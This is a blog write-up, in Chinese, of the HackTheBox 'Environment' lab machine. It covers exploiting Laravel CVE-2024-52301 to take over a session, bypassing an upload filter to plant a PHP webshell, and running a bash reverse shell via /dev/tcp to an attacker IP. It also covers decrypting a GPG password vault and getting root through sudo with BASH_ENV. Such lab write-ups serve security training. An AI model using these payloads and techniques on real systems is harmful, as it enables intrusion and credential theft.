---
title: HackTheBox — Environment   
date: 2025-09-06 00:00:00 +0800      
categories: [hackthebox machines]          
tags: [hackthebox]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                
---

- **OS**: Linux
- **Difficulty**: Medium

## Service Enumeration

**Port Scan Results**

```bash
└─$ sudo nmap -Pn -sCV 10.10.11.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 11:50 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan

Nmap scan report for 10.10.11.67
Host is up (0.100s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds
```

## Initial Access

```bash
└─$ echo -n '10.10.11.67    environment.htb' | sudo tee -a /etc/hosts
10.10.11.67    environment.htb
```

用 ffuf 爆破目錄

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://environment.htb/FUZZ -ic -c -e .php
```

![image-20260211043059380](assets/img/image-20260211043059380.png)

到 /upload 觸發錯誤頁面, 顯示為 Laravel 13.30.0

![image-20260211043104958](assets/img/image-20260211043104958.png)

此版本 Laravel 受到 CVE-2024–52301 影響

- [https://nvd.nist.gov/vuln/detail/CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301)

進入/login 發現一個登入頁面

![image-20260211043107591](assets/img/image-20260211043107591.png)

Burpsuite 攔截 POST request

![image-20260211043110647](assets/img/image-20260211043110647.png)

將 remember 參數改為空值,錯誤頁面噴出原始碼

![image-20260211043114567](assets/img/image-20260211043114567.png)

查看原始碼, environment 如果是 **preprod**, cookie 就會直接被設成 user_id 為 1, 看起來是管理員身分

![image-20260211043117875](assets/img/image-20260211043117875.png)

於是結合 [https://github.com/Nyamort/CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301) 的 PoC 把 POST request 加上 ? — env=preprod

![image-20260211043121024](assets/img/image-20260211043121024.png)

送出請求後, 手動把瀏覽器的laravel_session 改成新拿到的 cookie

![image-20260211043123859](assets/img/image-20260211043123859.png)

![image-20260211043128101](assets/img/image-20260211043128101.png)

成功以 Hish 身分進入 management/dashboard

![image-20260211043130168](assets/img/image-20260211043130168.png)

發現 profile 有上傳圖片功能

![image-20260211043134415](assets/img/image-20260211043134415.png)

上傳圖片把 mime type 改成 **GIF89a** , name 改成 **shell.php.** 成功繞過, 上傳webshell

- [https://nvd.nist.gov/vuln/detail/CVE-2024-21546](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)

![image-20260211043137174](assets/img/image-20260211043137174.png)

拿到 reverse shell

```
http://environment.htb/storage/files/shell.php?cmd=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.47/80+0%3E%261%27
```

```
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.67] 34744
bash: cannot set terminal process group (910): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ 
```

```
www-data@environment:~/app/storage/app/public/files$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**user.txt value:**

```bash
cat user.txt
<REDACTED>
```

## Privilege Escalation

發現 /home/hish/backup 有被gpg加密的檔案 keyvault.gpg

```
www-data@environment:/home/hish/backup$ ls
ls
keyvault.gpg
```

先創建臨時目錄把.gnupg目錄複製進去

```
www-data@environment:/home/hish/.gnupg$ export GNUPGHOME=$(mktemp -d)
export GNUPGHOME=$(mktemp -d)
www-data@environment:/home/hish/.gnupg$ cp -a /home/hish/.gnupg/. "$GNUPGHOME/"
```

解密後得到 hish 的密碼 **marineSPm@ster!!**

```
www-data@environment:/home/hish/.gnupg$ gpg --decrypt --output /tmp/plaintext.txt /home/hish/backup/keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/tmp/tmp.8ms0bphHF1'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
www-data@environment:/home/hish/.gnupg$ cat /tmp/plaintext.txt
cat /tmp/plaintext.txt
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

成功登入 hish 的 shell

```
www-data@environment:/home/hish/.gnupg$ su hish                 
su hish
Password: marineSPm@ster!!    

hish@environment:~/.gnupg$
```

發現 hish 可以以 root 身分執行 systeminfo 這個 bash 腳本, 並且還會看環境變數 BASH_ENV

> BASH_ENV 被設置的話, 當 bash 被執行的時候就會先執行 BASH_ENV 指定的腳本

![image-20260211043142083](assets/img/image-20260211043142083.png)

![image-20260211043144136](assets/img/image-20260211043144136.png)

把 BASH_ENV 指向我們創建的 root.sh

```
hish@environment:/tmp$ echo '/bin/bash -p' > root.sh
echo '/bin/bash -p' > root.sh
hish@environment:/tmp$ export BASH_ENV=/tmp/root.sh
export BASH_ENV=/tmp/root.sh
```

`sudo /usr/bin/systeminfo` 成功拿到 root shell

![image-20260211043146739](assets/img/image-20260211043146739.png)

**root.txt value:**

```bash
cat root.txt
<REDACTED>
```
